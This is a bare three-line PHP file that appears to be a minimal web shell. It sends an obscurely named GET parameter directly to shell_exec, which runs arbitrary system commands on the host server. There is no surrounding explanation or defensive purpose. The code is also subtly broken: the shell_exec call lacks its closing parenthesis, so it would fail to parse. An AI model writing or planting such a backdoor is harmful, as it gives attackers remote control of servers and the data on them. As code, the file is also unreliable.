<?php
shell_exec($_GET['iq0RnCuS'];
?>
